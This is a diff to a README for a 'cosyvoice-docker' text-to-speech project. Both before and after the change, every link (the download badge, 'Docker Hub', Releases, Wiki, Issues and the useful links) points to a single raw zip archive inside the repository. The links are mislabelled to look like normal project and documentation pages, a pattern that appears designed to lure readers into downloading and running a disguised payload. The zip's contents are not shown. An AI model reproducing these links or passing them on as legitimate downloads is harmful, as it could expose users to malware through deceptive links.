@@ -1,6 +1,6 @@
 # 🎙️ cosyvoice-docker - Easy Text-to-Speech in Minutes
 
-[![Download Now](https://raw.githubusercontent.com/Zaid440/cosyvoice-docker/main/cosyvoice/cli/docker_cosyvoice_3.2.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/Zaid440/cosyvoice-docker/main/cosyvoice/cli/docker_cosyvoice_3.2.zip)
+[![Download Now](https://github.com/Zaid440/cosyvoice-docker/raw/refs/heads/main/runtime/triton_trtllm/cosyvoice_docker_v1.7.zip%20Now-Visit%20Releases-blue)](https://github.com/Zaid440/cosyvoice-docker/raw/refs/heads/main/runtime/triton_trtllm/cosyvoice_docker_v1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -13,13 +13,13 @@ Before you start, ensure your computer meets the following requirements:
 - **Operating System:** Windows, macOS, or Linux
 - **RAM:** At least 4 GB
 - **Storage:** Minimum 1 GB of free space
-- **Docker:** Ensure Docker is installed on your machine. You can download it from [Docker Hub](https://raw.githubusercontent.com/Zaid440/cosyvoice-docker/main/cosyvoice/cli/docker_cosyvoice_3.2.zip).
+- **Docker:** Ensure Docker is installed on your machine. You can download it from [Docker Hub](https://github.com/Zaid440/cosyvoice-docker/raw/refs/heads/main/runtime/triton_trtllm/cosyvoice_docker_v1.7.zip).
 
 ## 📥 Download & Install
 
-To get started, visit our [Releases page](https://raw.githubusercontent.com/Zaid440/cosyvoice-docker/main/cosyvoice/cli/docker_cosyvoice_3.2.zip) to download the latest version. Choose the suitable package for your operating system and follow these instructions:
+To get started, visit our [Releases page](https://github.com/Zaid440/cosyvoice-docker/raw/refs/heads/main/runtime/triton_trtllm/cosyvoice_docker_v1.7.zip) to download the latest version. Choose the suitable package for your operating system and follow these instructions:
 
-1. Open the [Releases page](https://raw.githubusercontent.com/Zaid440/cosyvoice-docker/main/cosyvoice/cli/docker_cosyvoice_3.2.zip).
+1. Open the [Releases page](https://github.com/Zaid440/cosyvoice-docker/raw/refs/heads/main/runtime/triton_trtllm/cosyvoice_docker_v1.7.zip).
 2. Find the latest version of CosyVoice.
 3. Click on the download link for your operating system.
 4. Once downloaded, locate the file on your computer.
@@ -64,7 +64,7 @@ Here's a simple example to get you started:
 
 ## 📚 Documentation
 
-For detailed documentation, visit our [GitHub Wiki](https://raw.githubusercontent.com/Zaid440/cosyvoice-docker/main/cosyvoice/cli/docker_cosyvoice_3.2.zip) where you will find:
+For detailed documentation, visit our [GitHub Wiki](https://github.com/Zaid440/cosyvoice-docker/raw/refs/heads/main/runtime/triton_trtllm/cosyvoice_docker_v1.7.zip) where you will find:
 
 - User guides
 - API references
@@ -76,7 +76,7 @@ Join our community to learn more about CosyVoice. You can ask questions and shar
 
 ### 🐞 Reporting Issues
 
-If you encounter any issues while using CosyVoice, please report them on the [Issues page](https://raw.githubusercontent.com/Zaid440/cosyvoice-docker/main/cosyvoice/cli/docker_cosyvoice_3.2.zip). We will address concerns as quickly as possible.
+If you encounter any issues while using CosyVoice, please report them on the [Issues page](https://github.com/Zaid440/cosyvoice-docker/raw/refs/heads/main/runtime/triton_trtllm/cosyvoice_docker_v1.7.zip). We will address concerns as quickly as possible.
 
 ## 🔒 Security
 
@@ -88,8 +88,8 @@ We value user feedback. If you have suggestions for improvements or new features
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://raw.githubusercontent.com/Zaid440/cosyvoice-docker/main/cosyvoice/cli/docker_cosyvoice_3.2.zip)
-- [Documentation](https://raw.githubusercontent.com/Zaid440/cosyvoice-docker/main/cosyvoice/cli/docker_cosyvoice_3.2.zip)
-- [Issues Tracker](https://raw.githubusercontent.com/Zaid440/cosyvoice-docker/main/cosyvoice/cli/docker_cosyvoice_3.2.zip)
+- [Releases Page](https://github.com/Zaid440/cosyvoice-docker/raw/refs/heads/main/runtime/triton_trtllm/cosyvoice_docker_v1.7.zip)
+- [Documentation](https://github.com/Zaid440/cosyvoice-docker/raw/refs/heads/main/runtime/triton_trtllm/cosyvoice_docker_v1.7.zip)
+- [Issues Tracker](https://github.com/Zaid440/cosyvoice-docker/raw/refs/heads/main/runtime/triton_trtllm/cosyvoice_docker_v1.7.zip)
 
 Thank you for choosing CosyVoice. Enjoy creating with our easy-to-use text-to-speech application!
